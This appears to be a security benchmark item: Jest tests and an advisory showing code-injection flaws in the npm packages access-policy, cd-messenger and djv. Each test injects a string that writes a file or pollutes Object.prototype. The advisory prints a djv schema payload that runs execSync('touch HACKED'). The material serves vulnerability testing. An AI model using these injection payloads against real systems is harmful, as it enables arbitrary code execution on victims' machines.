secbench_test:
test("Arbitrary code execution in access-policy", () => {
  expect.assertions(2);
  const fs = require("fs");
  let a = require("access-policy");
  const path = "./access-policy";
  let statements = "`; require(`fs`).writeFileSync(`" + path + "`,``);//";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.encode(statements, data);
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});

test("Arbitrary code execution in cd-messenger", () => {
  expect.assertions(2);
  const fs = require("fs");
  const a = require("cd-messenger");
  const path = "./cd-messenger";
  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.line(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});

test("Arbitrary code execution in  djv", () => {
  expect.assertions(2);
  const djv = require("djv");
  expect({}.polluted).toBe(undefined);
  try {
    const env = new djv();
    const evilSchema = JSON.parse(
      '{"common":{"type":"array", "minItems":"1 + (Object.prototype.polluted = `yes`)"}}'
    );
    env.addSchema("test", evilSchema);
    env.validate("test#/common", { type: "custom" });
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});

advisory_descriptions:
djvis a dynamic json-schema validatorAffected versions of this package are vulnerable to Remote Code Execution (RCE). By controlling the schema file, an attacker can run arbitrary JavaScript code on the victim machine.const djv = require('djv');
const env = new djv();
const evilSchema = JSON.parse('{"common":{"type":"array", "minItems":"process.mainModule.require(`child_process`).execSync(`touch HACKED`)"}}')
env.addSchema('test', evilSchema);
env.validate('test#/common', { type: 'custom' });

